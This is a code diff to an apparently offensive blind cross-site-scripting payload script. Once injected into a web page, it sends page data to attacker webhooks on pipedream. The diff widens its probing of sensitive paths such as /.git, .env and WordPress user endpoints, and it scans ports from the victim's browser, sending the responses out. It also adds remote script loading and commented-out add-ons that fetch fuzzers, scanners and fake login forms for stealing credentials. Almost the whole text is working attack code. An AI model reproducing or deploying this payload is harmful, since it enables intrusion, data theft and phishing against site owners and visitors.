@@ -3,12 +3,24 @@ const basic_webhook_url = "https://something.m.pipedream.net"; // for basic info
 const advanced_webhook_url = "https://otherthing.m.pipedream.net"; // to get advanced info listed below
 
 // Specify paths to be found whenever the payload will be fired
-const paths = ['/admin', '/.git']; // advanced info
+const paths = [
+    '/admin',
+    '/.git',
+    '/robots.txt',
+    '/sitemap.xml',
+    '/wp-admin/wp-admin.php',
+    '/login',
+    '/wp-json/wp/v2/users/', // wordpress info leak CVE -> CVE-2017-5487
+    '/?rest_route=/wp/v2/users/', // wordpress info leak CVE -> CVE-2017-5487
+    '/login',
+    '.env'
+]; // advanced info
 
 // Specify ports to be scanned for a web server running
 const ports = [80, 443, 8080, 8443, 5500, 8008, 591]; // advanced info
 
 // Do not edit lines below
+// To load an add-on, jump to line 173, and uncomment the code snippet for the particular add-on
 // ============================================
 var lib_loaded = 0;
 function utoa(str) {
@@ -17,10 +29,10 @@ function utoa(str) {
 
 // Function that will generate an ID for fire
 function make_id(length) {
-    var result           = '';
-    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
+    for (var i = 0; i < length; i++) {
         result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     return result;
@@ -34,9 +46,7 @@ function load_libraries() {
     const jquery_script = document.createElement("script");
     jquery_script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
     jquery_script.type = 'text/javascript';
-    jquery_script.addEventListener('load', () => {
-
-    });
+    jquery_script.addEventListener('load', () => {});
     document.body.appendChild(jquery_script);
     lib_loaded = lib_loaded + 1;
 
@@ -44,10 +54,15 @@ function load_libraries() {
     const html2canvas_script = document.createElement("script");
     html2canvas_script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
     html2canvas_script.type = 'text/javascript';
-    html2canvas_script.addEventListener('load', () => {
-
-    });
+    html2canvas_script.addEventListener('load', () => {});
     document.body.appendChild(html2canvas_script);
+    lib_loaded = lib_loaded + 1;
+
+    const util_script = document.createElement("script");
+    util_script.src = "https://127.0.0.1/util.js";
+    util_script.type = "text/javascript";
+    util_script.addEventListener('load', ()=>{});
+    document.body.appendChild(util_script);
     lib_loaded = lib_loaded + 1;
 }
 load_libraries();
@@ -79,14 +94,13 @@ function search_additional_pages() {
     }
     if (paths != []) {
         for (path in paths) {
-            console.log(document.location.protocol + "//" + document.location.hostname + port + paths[path])
             $.ajax({
                 timeout: 5,
-                url: (document.location.protocol + "//" + document.location.hostname + port + paths[path]),
+                url: (document.location.origin + paths[path]),
                 async: false,
                 success: function (text) {
                     var response = text;
-                    push_addition_pgs_to_svr((document.location.protocol + "//" + document.location.hostname + port + paths[path]), response, "paths");
+                    push_addition_pgs_to_svr((document.location.origin + paths[path]), response, "paths");
                 }
             });
         }
@@ -103,7 +117,7 @@ function search_http_ports() {
                 async: false,
                 success: function (text) {
                     var resp = text;
-                    push_addition_pgs_to_svr(("http://" + document.location.hostname + ":" + ports[port]), resp, "ports")
+                    push_addition_pgs_to_svr(("http://" + document.location.hostname + ":" + ports[port]), resp, "ports");
                 }
             });
             $.ajax({
@@ -112,7 +126,7 @@ function search_http_ports() {
                 async: false,
                 success: function (text) {
                     var resp = text;
-                    push_addition_pgs_to_svr(("https://" + document.location.hostname + ":" + ports[port]), resp, "ports")
+                    push_addition_pgs_to_svr(("https://" + document.location.hostname + ":" + ports[port]), resp, "ports");
                 }
             });
         }
@@ -158,4 +172,28 @@ setTimeout(function () {
     send_pg_info();
     search_additional_pages();
     search_http_ports();
+    // ==================================================
+    // Uncomment line to load library
+
+    // Load all_port_scanner
+    // $.getScript('https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/all_port_scanner/all_port_scanner.js', function () {
+    //     scan_all_ports(document.location.hostname);
+    // });
+
+    // Load wordlist_fuzzer
+    // $.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/wordlist_fuzzer/wordlist_fuzzer.js", function () {
+    //     fuzz_path("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt", (document.location.origin));
+    // });
+
+    // Load login_creator - HTML
+    // $.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/login_creator/login_creator.js", function () {
+    //     fake_login_html('http://127.0.0.1:5500/addons/login_creator/forms/1.html');
+    // });
+
+    // Load login creator - Prompt
+    // $.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/login_creator/login_creator.js", function () {
+    //     fake_login_prompt(fire_id, "https://someotherthing.m.pipedream.net");
+    // });
+
+    // ==================================================
 }, delayInMilliseconds);
